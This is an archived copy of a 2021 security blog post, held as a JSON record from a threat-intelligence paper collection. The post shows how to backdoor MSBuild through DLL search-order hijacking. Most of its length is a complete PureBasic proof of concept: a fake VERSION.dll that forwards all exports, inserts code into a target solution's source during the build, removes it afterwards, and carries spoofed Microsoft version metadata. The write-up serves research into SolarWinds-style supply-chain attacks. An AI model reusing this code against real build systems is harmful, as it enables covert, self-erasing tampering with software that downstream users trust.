{
    "id": "969c28f6-d58e-4dc0-a7ed-8de1254172ef",
    "created_at": "2023-01-12T15:08:38.540234Z",
    "updated_at": "2025-03-27T02:06:08.913702Z",
    "deleted_at": null,
    "sha1_hash": "cfa5c799c998d2158fcc372d50ef9a8d15f10c27",
    "title": "2021-01-17 - Backdooring MSBuild",
    "authors": "",
    "file_creation_date": "2022-05-28T17:39:35Z",
    "file_modification_date": "2022-05-28T17:39:35Z",
    "file_size": 240048,
    "plain_text": "# Backdooring MSBuild\n\n**a12d404.net/ranting/2021/01/17/msbuild-backdoor.html**\n\n### Posted: 17 Jan 2021 - Updated: 17 Jan 2021 - Category: ranting - Tags: backdoor, sunburst, sunspot, rant\n\n In 2020, different United States federal government branches were affected by a massive data breach. One part of these efforts was an attack on SolarWinds and their platform, including the build-infrastructure of their flagship product, SolarWinds Orion. On January 11th, 2021, the CrowdStrike Intelligence Team published an analysis of a malicious tool deployed into SolarWinds’ build environment to inject the SUNBURST backdoor into the SolarWinds Orion platform at build-time.\n\n The CrowdStrike blog post was referred to me by a colleague. Initially, I thought it was pretty sloppy of the SUNSPOT developers to search for MSBuild.exe processes every second, then read the virtual memory of these remote processes to determine if the right solution is being build right now. In addition to all this noise, the SUNBURST attackers created a Scheduled Task to start the implant on every boot.\n\n\n-----\n\n### If one imagines that you are a top of the line attack boutique and compromised different hard targets, including the build-infrasturcture, why do you resort to such a crude way to execute that beautiful implanting attack?\n\n So how could one do better?\n\n## MSBuild Revisited\n\n### So, MSBuild, the Microsoft engine for building applications, uses (most of the time) XML files to steer the targeted solution’s build process.\n\n One of the first things you’ll notice when inspecting the MSBuild.exe binary is that it is itself a .NET Assembly. So what is the best way to backdoor (almost) any .NET Assembly?\n\n … right, using the version.dll trick.\n\n After running a quick build of an arbitrary solution (e.g. via\n```\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe\nSomeProject.sln /t:Build /p:Configuration=Release;Platform=Win64 ) and\n\n recording a trace with ProcMon, multiple DLLs are searched in the directory of\nMSBuild.exe :\n\n```\n\n-----\n\n```\n{ type : load not found\ndll\",\"event_path\":\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\mscoree.dll\",\n{\"type\":\"load-not-founddll\",\"event_path\":\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\ole32.dll\",\"p\n{\"type\":\"load-not-founddll\",\"event_path\":\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\api-ms-wincore-winrt-l1-10.dll\",\"process_image_path\":\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\MSB\n{\"type\":\"load-not-founddll\",\"event_path\":\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\VERSION.dll\",\n{\"type\":\"load-not-founddll\",\"event_path\":\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\api-ms-wincore-winrt-string-l1-10.dll\",\"process_image_path\":\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\MSB\n{\"type\":\"load-not-founddll\",\"event_path\":\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\sxs.dll\",\"pro\n{\"type\":\"load-not-founddll\",\"event_path\":\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\WindowsCodecs\n{\"type\":\"load-not-founddll\",\"event_path\":\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\VERSION.dll\",\n{\"type\":\"load-not-founddll\",\"event_path\":\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\mscoree.dll\",\n\n### Given these results, we can target MSBuild.exe or the C# compiler ( Csc.exe ) directly, depending on our preferences and objectives. As CrowdStrike mentioned, the implant checked for the right solution being built, so we also will target MSBuild.exe in our tests.\nVERSION.dll Structure\n\n For our purposes, it is enough to know that VERSION.dll exports 17 names, which we need to implement (or forward) to ensure the target’s functionality is not impaired.\n\n```\n\n-----\n\n```\n__export_name(GetFileVersionInfoA)\n__export_name(GetFileVersionInfoByHandle)\n__export_name(GetFileVersionInfoExA)\n__export_name(GetFileVersionInfoExW)\n__export_name(GetFileVersionInfoSizeA)\n__export_name(GetFileVersionInfoSizeExA)\n__export_name(GetFileVersionInfoSizeExW)\n__export_name(GetFileVersionInfoSizeW)\n__export_name(GetFileVersionInfoW)\n__export_name(VerFindFileA)\n__export_name(VerFindFileW)\n__export_name(VerInstallFileA)\n__export_name(VerInstallFileW)\n__export_name(VerLanguageNameA)\n__export_name(VerLanguageNameW)\n__export_name(VerQueryValueA)\n__export_name(VerQueryValueW)\n\n## Proof of Concept (PoC)\n\n### The following section describes a crude PoC that implements the backdoor functionality in a DLL without the need for reading remote process memory or triggering a process search every second.\n\n The PoC will be written in PureBasic, as no sane attacker will implement his implant in it and copy-pasting of this source is therefore not a concern ;-)\n\n Objectives\n\n The implant should have the following characteristics:\n\n no additional running processes no remote process actions (reading/ writing remote process memory, etc.) only trigger on the right solution being build insertion of the backdoor during the build process removal of the backdoored source file after the build process\n\n Implementation\n\n As we saw earlier, the VERSION.dll file is loaded very early by the .NET runtime. By implementing mock-functions, it is possible to verify that the DLL is not only loaded, but the function GetFileVersionInfoSizeW is called right before the build process is executed, as shown in the following figure.\n\n```\n\n-----\n\n### Given that, it is possible not to rely on any half-baked solution in the DllMain function and get around any problems with the Loader Lock by simply hijacking the call\n```\nGetFileVersionInfoSizeW, executing our backdoor insertion code, then calling the real\nGetFileVersionInfoSizeW function and returning its result.\n\n In the PoC presented below, the backdoor is inserted in the call to\nGetFileVersionInfoSizeW . The source is saved in memory, and as soon as DllMain is\n\n called with DLL_PROCESS_DETACH, the backdoor-code is removed by restoring the previous source code.\n\n## Conclusion\n\n### Targeting MSBuild directly by copying our VERSION.dll to the MSBuild directory, ensures better operational security as no additional processes need to be created, the memory search can be omitted and every build is captured, as our code is directly executed by MSBuild.\n\n```\n\n-----\n\n## Source\n\n### Source and a compiled binary is available in the blog’s Github repo.\n\n\n-----\n\n```\n;\n; *                                     *\n; * Author:   marpie ([email protected].net)                *\n; * License:   BSD 2-clause                        *\n; * Copyright:  (c) 2021, a12d404.net                   *\n; * Status:   Prototype                         *\n; * Created:   20200116                          *\n; * Last Update: 20200117                          *\n; *                                     *\n; ***************************************************************************\nEnableExplicit\n; --------------------------------------------------------------------------;- Consts\n#TARGET_SOLUTION = \"ConsoleApp1.sln\"\n#BACKDOOR_CODE = \"public Class1() { Console.WriteLine(\" + Chr(34) + \"Hello from the\nStatic initializer!\" + Chr(34) + \"); }\"\n#BACKDOOR_INSERT_AFTER = \"class Class1 {\"\n#BACKDOOR_ALIVE = $c45c9bda8db1\n#MIN_SIZE = 100 ; 100 bytes\n; --------------------------------------------------------------------------;- Variables\nGlobal mux.i = #Null   ; set in DLL_PROCESS_ATTACH\nGlobal hVersion.i = #Null ; orig version.dll handle\nGlobal active.i = 0    ; checked in CleanupBackdoor\nGlobal origContent.s = \"\"  ; ptr to memory of the original source\nGlobal origContentSize.i = 0 ; size of the original source\n; --------------------------------------------------------------------------;- Backdoor Handling\nProcedure.s GetTargetFilePath()\n Define i.i\n Define path.s\n For i = 0 To CountProgramParameters()\n  path = ProgramParameter(i)\n  If CountString(path, #TARGET_SOLUTION) > 0\n   ProcedureReturn GetPathPart(path) + \"Program.cs\"\n  EndIf\n Next\n ProcedureReturn \"\"\nEndProcedure\nProcedure.b ReadOrigContent(hFile.i)\n Define res.b = #False\n FileSeek(hFile, 0, #PB_Absolute)\n Define size.i = Lof(hFile)\n Define *mem = AllocateMemory(size)\n If ReadData(hFile, *mem, size) <> size\n  Goto ReadAllCleanup\n EndIf\n\n```\n\n-----\n\n```\n origContent PeekS( mem, size, #PB_UTF8)\n origContentSize = Len(origContent)\n res = #True\nReadAllCleanup:\n If *mem\n  FreeMemory(*mem)\n EndIf\n ProcedureReturn res\nEndProcedure\n; InsertBackdoor needs to be called from a function holing mux!\nProcedure.b InsertBackdoor(path.s)\n Define res.b = #False\n Define hFile.i = OpenFile(#PB_Any, path, #PB_File_SharedRead | #PB_UTF8)\n If Not hFile\n  ProcedureReturn res\n EndIf\n ; read file content\n If Not ReadOrigContent(hFile)\n  Goto InsertBackdoorError\n EndIf\n ; check if the right code is present\n Define pos.i = FindString(origContent, #BACKDOOR_INSERT_AFTER)-1\n If pos < 0\n  Goto InsertBackdoorError\n EndIf\n ; revert file to 0\n FileSeek(hFile, 0, #PB_Absolute)\n TruncateFile(hFile)\n ; write content till start of backdoor\n Define writeSize.i = pos+Len(#BACKDOOR_INSERT_AFTER)\n Define sizeLeft = writeSize\n If WriteString(hFile, Left(origContent, writeSize), #PB_UTF8) = 0\n  ; we should add a restore of the original file here\n  ; ... depending on the write error ...\n  Goto InsertBackdoorError\n EndIf\n ; write backdoor\n writeSize = Len(#BACKDOOR_CODE)\n If WriteString(hFile, #BACKDOOR_CODE, #PB_UTF8) = 0\n  ; we should add a restore of the original file here\n  ; ... depending on the write error ...\n  Goto InsertBackdoorError\n EndIf\n ; write rest of file\n writeSize = origContentSize-sizeLeft\n If WriteString(hFile, Right(origContent, writeSize), #PB_UTF8) = 0\n\n```\n\n-----\n\n```\n  ; we should add a restore of the original file here\n  ; ... depending on the write error ...\n  Goto InsertBackdoorError\n EndIf\n res = #True\nInsertBackdoorCleanup:\n CloseFile(hFile)\n ProcedureReturn res\nInsertBackdoorError: \n If Len(origContent) > 0\n  origContent = \"\"\n  origContentSize= 0\n EndIf\n Goto InsertBackdoorCleanup\nEndProcedure\nProcedure ActivateBackdoor()\n LockMutex(mux)\n ; check if the backdoor is already alive\n If #BACKDOOR_ALIVE = active\n  Goto ActivateBackdoorCleanup\n EndIf\n ; check if we have the right solution\n Define targetFilepath.s = GetTargetFilePath()\n If Len(targetFilepath) < 1\n  Goto ActivateBackdoorCleanup\n EndIf\n MessageRequester(\"ActivateBackdoor\", \"Hello World from Solution: \" + #CRLF$ +\nProgramParameter(0))\n ; init backdoor\n If InsertBackdoor(targetFilepath)\n  active = #BACKDOOR_ALIVE\n  MessageRequester(\"ActivateBackdoor\", \"... backdoor insered ...\")\n Else\n  MessageRequester(\"ActivateBackdoor\", \"... backdooring failed ...\")\n EndIf\nActivateBackdoorCleanup:\n UnlockMutex(mux)\n ProcedureReturn\nEndProcedure\nProcedure CleanupBackdoor()\n LockMutex(mux)\n If #BACKDOOR_ALIVE = active\n  active = #Null\n  ; Do cleanup here\n  If origContentSize <> 0\n   Define hFile.i = CreateFile(#PB_Any, GetTargetFilePath(), #PB_UTF8)\n   If hFile\n    WriteString(hFile, origContent, #PB_UTF8)\n    CloseFile(hFile)\n\n```\n\n-----\n\n```\n   EndIf\n   origContent = \"\"\n   origContentSize = 0\n  EndIf\n EndIf\nCleanupBackdoorCleanup:\n UnlockMutex(mux)\n ProcedureReturn\nEndProcedure\n; --------------------------------------------------------------------------;- DllMain Stuff\nProcedureDLL AttachProcess(Instance)\n mux = CreateMutex()\nEndProcedure\nProcedureDLL DetachProcess(Instance)\n CleanupBackdoor()\nEndProcedure\n; --------------------------------------------------------------------------;- orig VERSION.dll Stuff\nProcedure.i LoadVersionDll()\n Define res.i = #Null\n LockMutex(mux)\n If #Null = hVersion\n  ; load version.dll\n  Define dllPath.s = GetEnvironmentVariable(\"windir\") + \"\\system32\\version.dll\"\n  hVersion = OpenLibrary(#PB_Any, dllPath)\n EndIf\n res = hVersion\nCleanupLoadVersionDll:\n UnlockMutex(mux)\n ProcedureReturn res\nEndProcedure\n;BOOL GetFileVersionInfoA(\n; LPCSTR lptstrFilename,\n; DWORD dwHandle,\n; DWORD dwLen,\n; LPVOID lpData\n;);\nProcedureDLL.i GetFileVersionInfoA(a1.i, a2.l, a3.l, a4.i)\n ActivateBackdoor()\n ProcedureReturn CallCFunction(LoadVersionDll(), \"GetFileVersionInfoA\", a1, a2, a3,\na4)\nEndProcedure\n;BOOL GetFileVersionInfoExA(\n; DWORD dwFlags,\n; LPCSTR lpwstrFilename,\n; DWORD dwHandle,\n; DWORD dwLen,\n\n```\n\n-----\n\n```\n; LPVOID lpData\n;);\nProcedureDLL.i GetFileVersionInfoExA(a1.l, a2.i, a3.l, a4.l, a5.i)\n ActivateBackdoor()\n ProcedureReturn CallCFunction(LoadVersionDll(), \"GetFileVersionInfoExA\", a1, a2,\na3, a4, a5)\nEndProcedure\n;BOOL GetFileVersionInfoExW(\n; DWORD  dwFlags,\n; LPCWSTR lpwstrFilename,\n; DWORD  dwHandle,\n; DWORD  dwLen,\n; LPVOID lpData\n;);\nProcedureDLL.i GetFileVersionInfoSizeExW(a1.l, a2.i, a3.l, a4.l, a5.i)\n ActivateBackdoor()\n ProcedureReturn CallCFunction(LoadVersionDll(), \"GetFileVersionInfoSizeExW\", a1,\na2, a3, a4, a5)\nEndProcedure\n;DWORD GetFileVersionInfoSizeA(\n; LPCSTR lptstrFilename,\n; LPDWORD lpdwHandle\n;);\nProcedureDLL.i GetFileVersionInfoSizeA(a1.i, a2.i)\n ActivateBackdoor()\n ProcedureReturn CallCFunction(LoadVersionDll(), \"GetFileVersionInfoSizeA\", a1, a2)\nEndProcedure\n;DWORD GetFileVersionInfoSizeExA(\n; DWORD  dwFlags,\n; LPCSTR lpwstrFilename,\n; LPDWORD lpdwHandle\n;);\nProcedureDLL.i GetFileVersionInfoSizeExA(a1.l, a2.i, a3.i)\n ActivateBackdoor()\n ProcedureReturn CallCFunction(LoadVersionDll(), \"GetFileVersionInfoSizeExA\", a1,\na2, a3)\nEndProcedure\n;DWORD GetFileVersionInfoSizeExW(\n; DWORD  dwFlags,\n; LPCWSTR lpwstrFilename,\n; LPDWORD lpdwHandle\n;);\nProcedureDLL.i GetFileVersionInfoExW(a1.l, a2.i, a3.i)\n ActivateBackdoor()\n ProcedureReturn CallCFunction(LoadVersionDll(), \"GetFileVersionInfoExW\", a1, a2,\na3)\nEndProcedure\n;DWORD GetFileVersionInfoSizeW(\n; LPCWSTR lptstrFilename,\n; LPDWORD lpdwHandle\n\n```\n\n-----\n\n```\n;);\nProcedureDLL.i GetFileVersionInfoSizeW(a1.i, a2.i)\n ActivateBackdoor()\n ProcedureReturn CallCFunction(LoadVersionDll(), \"GetFileVersionInfoExW\", a1, a2)\nEndProcedure\n;BOOL GetFileVersionInfoW(\n; LPCWSTR lptstrFilename,\n; DWORD  dwHandle,\n; DWORD  dwLen,\n; LPVOID lpData\n;);\nProcedureDLL.i GetFileVersionInfoW(a1.i, a2.l, a3.l, a4.i)\n ActivateBackdoor()\n ProcedureReturn CallCFunction(LoadVersionDll(), \"GetFileVersionInfoW\", a1, a2, a3,\na4)\nEndProcedure\n; int hMem, LPCWSTR lpFileName, int v2, int v3\nProcedureDLL.i GetFileVersionInfoByHandle(a1.i, a2.i, a3.i, a4.l)\n ActivateBackdoor()\n ProcedureReturn CallCFunction(LoadVersionDll(), \"GetFileVersionInfoByHandle\", a1,\na2, a3, a4)\nEndProcedure\n;DWORD VerFindFileA(\n; DWORD uFlags,\n; LPCSTR szFileName,\n; LPCSTR szWinDir,\n; LPCSTR szAppDir,\n; LPSTR szCurDir,\n; PUINT puCurDirLen,\n; LPSTR szDestDir,\n; PUINT puDestDirLen\n;);\nProcedureDLL.i VerFindFileA(a1.l, a2.i, a3.i, a4.i, a5.i, a6.i, a7.i, a8.i)\n ActivateBackdoor()\n ProcedureReturn CallCFunction(LoadVersionDll(), \"VerFindFileA\", a1, a2, a3, a4,\na5, a6, a7, a8)\nEndProcedure\n;DWORD VerFindFileW(\n; DWORD  uFlags,\n; LPCWSTR szFileName,\n; LPCWSTR szWinDir,\n; LPCWSTR szAppDir,\n; LPWSTR szCurDir,\n; PUINT  puCurDirLen,\n; LPWSTR szDestDir,\n; PUINT  puDestDirLen\n;);\nProcedureDLL.i VerFindFileW(a1.l, a2.i, a3.i, a4.i, a5.i, a6.i, a7.i, a8.i)\n ActivateBackdoor()\n ProcedureReturn CallCFunction(LoadVersionDll(), \"VerFindFileW\", a1, a2, a3, a4,\na5, a6, a7, a8)\n\n```\n\n-----\n\n```\nEndProcedure\n;DWORD VerInstallFileA(\n; DWORD uFlags,\n; LPCSTR szSrcFileName,\n; LPCSTR szDestFileName,\n; LPCSTR szSrcDir,\n; LPCSTR szDestDir,\n; LPCSTR szCurDir,\n; LPSTR szTmpFile,\n; PUINT puTmpFileLen\n;);\nProcedureDLL.i VerInstallFileA(a1.l, a2.i, a3.i, a4.i, a5.i, a6.i, a7.i, a8.i)\n ActivateBackdoor()\n ProcedureReturn CallCFunction(LoadVersionDll(), \"VerInstallFileA\", a1, a2, a3, a4,\na5, a6, a7, a8)\nEndProcedure\n;DWORD VerInstallFileW(\n; DWORD  uFlags,\n; LPCWSTR szSrcFileName,\n; LPCWSTR szDestFileName,\n; LPCWSTR szSrcDir,\n; LPCWSTR szDestDir,\n; LPCWSTR szCurDir,\n; LPWSTR szTmpFile,\n; PUINT  puTmpFileLen\n;);\nProcedureDLL.i VerInstallFileW(a1.l, a2.i, a3.i, a4.i, a5.i, a6.i, a7.i, a8.i)\n ActivateBackdoor()\n ProcedureReturn CallCFunction(LoadVersionDll(), \"VerInstallFileW\", a1, a2, a3, a4,\na5, a6, a7, a8)\nEndProcedure\n;DWORD VerLanguageNameA(\n; DWORD wLang,\n; LPSTR szLang,\n; DWORD cchLang\n;);\nProcedureDLL.i VerLanguageNameA(a1.l, a2.i, a3.l)\n ActivateBackdoor()\n ProcedureReturn CallCFunction(LoadVersionDll(), \"VerLanguageNameA\", a1, a2, a3)\nEndProcedure\n;DWORD VerLanguageNameW(\n; DWORD wLang,\n; LPWSTR szLang,\n; DWORD cchLang\n;);\nProcedureDLL.i VerLanguageNameW(a1.l, a2.i, a3.l)\n ActivateBackdoor()\n ProcedureReturn CallCFunction(LoadVersionDll(), \"VerLanguageNameW\", a1, a2, a3)\nEndProcedure\n;BOOL VerQueryValueA(\n\n```\n\n-----\n\n```\n; LPCVOID pBlock,\n; LPCSTR lpSubBlock,\n; LPVOID *lplpBuffer,\n; PUINT  puLen\n;);\nProcedureDLL.i VerQueryValueA(a1.i, a2.i, a3.i, a4.l)\n ActivateBackdoor()\n ProcedureReturn CallCFunction(LoadVersionDll(), \"VerQueryValueA\", a1, a2, a3, a4)\nEndProcedure\n;BOOL VerQueryValueW(\n; LPCVOID pBlock,\n; LPCWSTR lpSubBlock,\n; LPVOID *lplpBuffer,\n; PUINT  puLen\n;);\nProcedureDLL.i VerQueryValueW(a1.i, a2.i, a3.i, a4.l)\n ActivateBackdoor()\n ProcedureReturn CallCFunction(LoadVersionDll(), \"VerQueryValueW\", a1, a2, a3, a4)\nEndProcedure\n; --------------------------------------------------------------------------; IDE Options = PureBasic 5.73 LTS (Windows - x64)\n; ExecutableFormat = Shared dll\n; CursorPosition = 85\n; FirstLine = 60\n; Folding = ----; Executable = version.dll\n; CompileSourceDirectory\n; EnablePurifier\n; IncludeVersionInfo\n; VersionField2 = Microsoft Corporation\n; VersionField3 = Microsoft® Windows® Operating System\n; VersionField5 = 10.0.20190.1000 (WinBuild.160101.0800)\n; VersionField6 = Version Checking and File Installation Libraries\n; VersionField7 = version\n; VersionField8 = VERSION.DLL\n; VersionField9 = © Microsoft Corporation. All rights reserved.\n; VersionField15 = VOS_NT\n; VersionField16 = VFT_DLL\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-01-17 - Backdooring MSBuild.pdf"
    ],
    "report_names": [
        "2021-01-17 - Backdooring MSBuild.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536118,
    "ts_updated_at": 1743041168,
    "ts_creation_date": 1653759575,
    "ts_modification_date": 1653759575,
    "files": {
        "pdf": "https://archive.orkl.eu/cfa5c799c998d2158fcc372d50ef9a8d15f10c27.pdf",
        "text": "https://archive.orkl.eu/cfa5c799c998d2158fcc372d50ef9a8d15f10c27.txt",
        "img": "https://archive.orkl.eu/cfa5c799c998d2158fcc372d50ef9a8d15f10c27.jpg"
    }
}